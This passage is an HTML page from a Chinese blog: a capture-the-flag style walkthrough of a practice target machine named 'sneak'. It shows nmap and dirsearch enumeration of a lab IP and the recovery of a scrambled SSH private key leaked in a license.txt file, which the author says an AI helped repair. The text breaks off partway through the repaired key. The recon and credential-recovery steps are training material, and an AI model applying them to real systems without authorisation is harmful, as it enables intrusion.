@@ -1,0 +1,640 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>群友靶机-sneak | Moriiの博客</title><meta name="keywords" content="群友靶机"><meta name="author" content="Morii"><meta name="copyright" content="Morii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="群友靶机-sneak信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa] └─# nmap 192.168.161.126 -A -p- Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-14 10:24 EDT Nmap scan report for 192.168.161.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="群友靶机-sneak">
+<meta property="og:url" content="https://drume2.github.io/posts/f834b323.html">
+<meta property="og:site_name" content="Moriiの博客">
+<meta property="og:description" content="群友靶机-sneak信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa] └─# nmap 192.168.161.126 -A -p- Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-14 10:24 EDT Nmap scan report for 192.168.161.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp">
+<meta property="article:published_time" content="2025-07-14T14:17:13.000Z">
+<meta property="article:modified_time" content="2025-07-14T15:04:41.814Z">
+<meta property="article:author" content="Morii">
+<meta property="article:tag" content="群友靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp"><link rel="shortcut icon" href="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp"><link rel="canonical" href="https://drume2.github.io/posts/f834b323"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '群友靶机-sneak',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-07-14 23:04:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/background.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/index_ee.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Moriiの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">群友靶机-sneak</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-14T14:17:13.000Z" title="发表于 2025-07-14 22:17:13">2025-07-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-14T15:04:41.814Z" title="更新于 2025-07-14 23:04:41">2025-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="群友靶机-sneak"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="群友靶机-sneak"><a href="#群友靶机-sneak" class="headerlink" title="群友靶机-sneak"></a>群友靶机-sneak</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# nmap 192.168.161.126 -A -p-
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-14 10:24 EDT
+Nmap scan report for 192.168.161.126
+Host is up (0.00064s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22&#x2F;tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80&#x2F;tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Site doesn&#39;t have a title (text&#x2F;html).
+|_http-server-header: Apache&#x2F;2.4.62 (Debian)
+MAC Address: 08:00:27:94:5A:61 (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.64 ms 192.168.161.126
+
+OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 14.17 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>开放了22和80端口</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>web80页面只回显了index字样，没有其他内容，用dirsearch扫一下目录</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# dirsearch -u http:&#x2F;&#x2F;192.168.161.126&#x2F;
+&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;dirsearch&#x2F;dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https:&#x2F;&#x2F;setuptools.pypa.io&#x2F;en&#x2F;latest&#x2F;pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (&#x2F;_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: &#x2F;home&#x2F;kali&#x2F;aaa&#x2F;reports&#x2F;http_192.168.161.126&#x2F;__25-07-14_10-25-28.txt
+
+Target: http:&#x2F;&#x2F;192.168.161.126&#x2F;
+
+[10:25:28] Starting:
+[10:25:32] 403 -  280B  - &#x2F;.ht_wsr.txt
+[10:25:32] 403 -  280B  - &#x2F;.htaccess_sc
+[10:25:32] 403 -  280B  - &#x2F;.htaccess.bak1
+[10:25:32] 403 -  280B  - &#x2F;.htaccess.save
+[10:25:32] 403 -  280B  - &#x2F;.htaccess_extra
+[10:25:32] 403 -  280B  - &#x2F;.htaccess_orig
+[10:25:32] 403 -  280B  - &#x2F;.htaccess.orig
+[10:25:32] 403 -  280B  - &#x2F;.htaccessBAK
+[10:25:32] 403 -  280B  - &#x2F;.htaccess.sample
+[10:25:32] 403 -  280B  - &#x2F;.htm
+[10:25:32] 403 -  280B  - &#x2F;.htaccessOLD
+[10:25:32] 403 -  280B  - &#x2F;.httr-oauth
+[10:25:32] 403 -  280B  - &#x2F;.htpasswd_test
+[10:25:32] 403 -  280B  - &#x2F;.html
+[10:25:32] 403 -  280B  - &#x2F;.htaccessOLD2
+[10:25:32] 403 -  280B  - &#x2F;.htpasswds
+[10:25:34] 403 -  280B  - &#x2F;.php
+[10:26:04] 301 -  316B  - &#x2F;cms  -&gt;  http:&#x2F;&#x2F;192.168.161.126&#x2F;cms&#x2F;
+[10:26:04] 500 -    0B  - &#x2F;cms&#x2F;
+[10:26:53] 403 -  280B  - &#x2F;server-status&#x2F;
+[10:26:53] 403 -  280B  - &#x2F;server-status
+
+Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>两个cms路径，只不过<code>/cms</code>的状态为301,<code>/cms/</code>的状态为500，并且在<code>/cms</code>路径下没有内容显示，吸取上次的教训，再次扫一下目录</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# dirsearch -u http:&#x2F;&#x2F;192.168.161.126&#x2F;cms
+&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;dirsearch&#x2F;dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https:&#x2F;&#x2F;setuptools.pypa.io&#x2F;en&#x2F;latest&#x2F;pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (&#x2F;_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: &#x2F;home&#x2F;kali&#x2F;aaa&#x2F;reports&#x2F;http_192.168.161.126&#x2F;_cms_25-07-14_10-31-58.txt
+
+Target: http:&#x2F;&#x2F;192.168.161.126&#x2F;
+
+[10:31:58] Starting: cms&#x2F;
+[10:32:02] 200 -  413B  - &#x2F;cms&#x2F;.gitignore
+[10:32:02] 403 -  280B  - &#x2F;cms&#x2F;.ht_wsr.txt
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htaccess_orig
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htaccess.orig
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htaccess.bak1
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htaccess_extra
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htaccess.save
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htaccessOLD
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htaccessBAK
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htaccessOLD2
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htaccess.sample
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.html
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htaccess_sc
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htpasswd_test
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.httr-oauth
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htm
+[10:32:03] 403 -  280B  - &#x2F;cms&#x2F;.htpasswds
+[10:32:05] 403 -  280B  - &#x2F;cms&#x2F;.php
+[10:32:38] 200 -    0B  - &#x2F;cms&#x2F;config.php
+[10:32:40] 200 -    0B  - &#x2F;cms&#x2F;content&#x2F;
+[10:32:39] 301 -  324B  - &#x2F;cms&#x2F;content  -&gt;  http:&#x2F;&#x2F;192.168.161.126&#x2F;cms&#x2F;content&#x2F;
+[10:32:40] 301 -  321B  - &#x2F;cms&#x2F;core  -&gt;  http:&#x2F;&#x2F;192.168.161.126&#x2F;cms&#x2F;core&#x2F;
+[10:32:57] 301 -  324B  - &#x2F;cms&#x2F;install  -&gt;  http:&#x2F;&#x2F;192.168.161.126&#x2F;cms&#x2F;install&#x2F;
+[10:32:58] 200 -  543B  - &#x2F;cms&#x2F;install&#x2F;index.php?upgrade&#x2F;
+[10:32:58] 200 -  543B  - &#x2F;cms&#x2F;install&#x2F;
+[10:33:01] 301 -  320B  - &#x2F;cms&#x2F;lib  -&gt;  http:&#x2F;&#x2F;192.168.161.126&#x2F;cms&#x2F;lib&#x2F;
+[10:33:01] 200 -    0B  - &#x2F;cms&#x2F;lib&#x2F;
+[10:33:02] 200 -    2KB - &#x2F;cms&#x2F;license.txt
+[10:33:09] 301 -  324B  - &#x2F;cms&#x2F;modules  -&gt;  http:&#x2F;&#x2F;192.168.161.126&#x2F;cms&#x2F;modules&#x2F;
+[10:33:09] 200 -    0B  - &#x2F;cms&#x2F;modules&#x2F;
+[10:33:25] 200 -    1KB - &#x2F;cms&#x2F;README.md
+[10:33:27] 200 -   90B  - &#x2F;cms&#x2F;robots.txt
+[10:33:38] 301 -  323B  - &#x2F;cms&#x2F;styles  -&gt;  http:&#x2F;&#x2F;192.168.161.126&#x2F;cms&#x2F;styles&#x2F;
+
+Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>里面有两个有用的信息<code>/cms/license.txt</code>和<code>/cms/robots.txt</code></p>
+<p>先看一下<code>license.txt</code></p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# curl http:&#x2F;&#x2F;192.168.161.126&#x2F;cms&#x2F;license.txt
+-----YEK ETAVIRP HSSNEPO NIGEB-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+sAdd&#x2F;5SMN1KWatGo&#x2F;1evq+7bfETGlpGM2U5Oi7e8nMF2&#x2F;mDX2PJzAEYAAAQAAEwAAAAAhN
+8vtXIS94jYewIuOQ3qS5ya5ET3o0Ok33k5m9oy+ekd2A8oHiJJUBD8CPst&#x2F;BR4PMM+OIYq
+CugO2A2hUNf4TK8+J&#x2F;RSLgmuZ9PW5KHzTezkcuONjFFWCvgtGzY1YrCzvIjdVZn9JAngQ9
+g&#x2F;MRe8qLORDFocrlGt+h4NUfrgxaoBQhJfiMZ9ygZA1xYdC&#x2F;5JtCuXeAvM69jREOaxLA13
+zC2umAuwE4CUKEenEK2+4B4JRkq1wcVOYR8DeAbnAb&#x2F;lvn&#x2F;edv2QS74OgBZizuTo9ZS+20
++kQNrEKqcPUv&#x2F;CEjnOL5225HYA5WIUaOPbS4wIrPewLXMZ4UCJrDR5qh2VlJgGxbkx86Rj
+vPy1xifMKxxT35lAOQGMysOhSaohFWCoSdqx7H8mQIlRAMK5+g8vRR0MLfG6&#x2F;8dziq5QYl
+CMF4kKogzmcOR6RVA+jTkVB821JKS3e46Y5DoKh7AAAFiBz2r4oc9q+KAAAAB3NzaC1yc2
+H2IevEyV7LPLQX3fuETTtilWrB6ft3rq&#x2F;+2HxkRZqBjNVuj4uH&#x2F;JTh9v5wl9TyMABGAAAE
+sCLjkN6kucmuRE96NDpN95OZvaMvnpHdgPKB4iSVAQ&#x2F;Aj7LfwUeDzDPjiGKvUIJwCfZ2VX
+QkziKvXEzPogLojNgdIVzH+kCvfyfk0CopbW&#x2F;jVuyx8k3MJnrTzYRhlwLYrxMWN2qw8LyY
+xaHK5RrfoeDVH64MWqAUISX4jGfcoGQNcWHQv+SbQrl3gLzOvY0RDmsSwNd9NvkmfaE7s4
+1DnqCxaDEp&#x2F;sgtrJgLMBuAlCh3JhitPeAeSEpaNMXlDWE&#x2F;gHw2Jw2f575vX3rNk0OuDYQm
+L&#x2F;whI5zi+dtuR2AOViFGjj20uMCKz3sC1zGeFAiaw0eaodlZSYBsW5MfOkY5WEOaos3fP+
+n5MIqCJeBjw7jcds4HjSc80deJgDkBjMrTokGaYhlAqUna8+BvJESZEAjSuPI&#x2F;bUENzynh
+DkekVQPo05FQfNtSSkt3uOmOQ6CoewAAAAMBAAEAAAGAFNe6UNkdX5fRSQfSisl&#x2F;9NzSIg
+wAgRSzrZkhHVUXz3+T373wkBttVkjAd1t8iNU0udXCg3cZcclCFHDIP345xlkqtDxFQMsf
+RATRmnKH4if3O&#x2F;0p&#x2F;vRBmMPEwHEmHbP2f+K8gEdKsV1oLBGkqSV3jnH0To72q9UMvNavZY
+eWD9b8W0hSdu+qkbmlcI9FZmL+yXWpoiag+RPlnaIyk+OjzHfcUwnp81JNCIA8fObRHgW7
+aJ3Q&#x2F;ySGXsj7F8FkdHvZMpPDK4ZKMRdx7UalxY14RlUi2500eZawNbFd&#x2F;cPUkVFSPl&#x2F;mlY
+O4yLkC4jUKtXW8Vu2GDlVz495SE5yIDqsP2d6s5RHXNfMVxYySHF3CyIxLuq5vclyku4sr
+OTe2CmPjFYfQSrF4JT0JhQBMWXIrRetIUiyQULFFYxSvQZ0xm&#x2F;wBZDiO8npE+0dG&#x2F;Czelb
+AAAAxklCGnnTo1Jbjs0N9uhlvzyL5fXTibhUvVhIeIvVxF3xkODLXJxV&#x2F;BqhnpwPDM+rMN
+wGg79PTiKC6HwVFRxxQGnPufZ8Go1KeLfpJ0TR3RQ0TNPh54eFH&#x2F;O+YAmTRDKeDU5fxrQY
+MRqZx7&#x2F;je0GTAwbbpEVcf20lYLDc0ygsCnRF92ZnB4N6&#x2F;KWCsDoVxX2+e6nF54K8w&#x2F;&#x2F;5O1
+R9wxe4c&#x2F;2e9ifWnYljQe9PzOoPOCdZgz1v1jYvON17T+MVuudygdNRLZw+ZgBf1xVQYHBu
+yCg1p+s+ASIw01U5AEMAAAwWaHDSG&#x2F;RHnoJw4qBeiUTA0H6Uudn0FcVuC9UApP5Z8dCdP0
+8kiVzZNbGxOKTWNPvubFREDC3rOKfxwIqkMMm22Kl1zOOKRL5KQYUeIPgm&#x2F;FE27Q204TLN
+tkwzr&#x2F;RuH9nGj4X3UF+gxjDed5QkMf7f10+8BkVVh8PULRxKuyCbZ7Rlp+TnGiJud35I1u
+jSQ7sjSRRjY7zJaF+PddkcnleejwHcNy48WUSesTKRSZQfTwqWN5DGIL23&#x2F;BRhRWUr4iKq
+D60XD8ng8Emm8qz1oh2GcYjM22s3MIZZkDQwAAAAT2ZbedvPMgwrxScQulmYH9cZCOP9Fh
+T5AHbmxc0QWQIKpIyhH4&#x2F;w1BTXfeBmoRca80dhpMUK+idiYG9TOYW2yAczR3nCUYHhYuV2
+ujfICkFANZoCfe8p&#x2F;aYoWunCn8aHt9EosO6yIZ0+UNd9rrI3arzLr7OertbKaPMMLUJJqS
+sX74l65qBqWMs8knQ2mxI6hmmZ+Tqvl+b2KqtsdML7VbLXTlfJmNxKwDnzMJ1QrINssBDx
+&#x3D;&#x3D;wBGUABDIQArFWZuNFQtRWYzl3cMAAAAkn2WUqipD5tU8
+-----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>是一个有问题的ssh密钥，根据靶机名丢给ai，让ai修复一下</p>
+<pre class="line-numbers language-none"><code class="language-none">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAzJP2XDm&#x2F;2FMn8e7iO5U2MGplGTEfb7+qve1&#x2F;oGtaWK1NMS5&#x2F;ddAs
+8vtXIS94jYewIuOQ3qS5ya5ET3o0Ok33k5m9oy+ekd2A8oHiJJUBD8CPst&#x2F;BR4PMM+OIYq
+9QgnAJ9nZVdjIvzCrY1YzGtgvCWFFjNOuckzeTzHK5WP9ZumgLSR&#x2F;J+8KT4fNUh2A2OguC
+g&#x2F;MRe8qLORDFocrlGt+h4NUfrgxaoBQhJfiMZ9ygZA1xYdC&#x2F;5JtCuXeAvM69jREOaxLA13
+02+SZ9oTuziZBgO47SQ2vde&#x2F;nvl&#x2F;bAnbAeD8RYOVcw1qkRJ4B4+2KEneEKUC4EwuAmu2Cz
++kQNrEKqcPUv&#x2F;CEjnOL5225HYA5WIUaOPbS4wIrPewLXMZ4UCJrDR5qh2VlJgGxbkx86Rj
+lYQ5qizd8&#x2F;6GfLM0RRv8g+5KMARlIQm8H7xqdSoCWFhoaShOsyMGQOAl53TxxKMfix1yPv
+CMF4kKogzmcOR6RVA+jTkVB821JKS3e46Y5DoKh7AAAFiBz2r4oc9q+KAAAAB3NzaC1yc2
+EAAAGBAMyT9lw5v9hTJ&#x2F;Hu4juVNjBqZRkxH2+&#x2F;qr3tf6BrWlitTTEuf3XQLPL7VyEveI2H
+sCLjkN6kucmuRE96NDpN95OZvaMvnpHdgPKB4iSVAQ&#x2F;Aj7LfwUeDzDPjiGKvUIJwCfZ2VX
+YyL8wq2NWMxrYLwlhRYzTrnJM3k8xyuVj&#x2F;WbpoC0kfyfvCk+HzVIdgNjoLgoPzEXvKizkQ
+xaHK5RrfoeDVH64MWqAUISX4jGfcoGQNcWHQv+SbQrl3gLzOvY0RDmsSwNd9NvkmfaE7s4
+mQYDuO0kNr3Xv575f2wJ2wHg&#x2F;EWDlXMNapESeAePtihJ3hClAuBMLgJrtgs&#x2F;pEDaxCqnD1
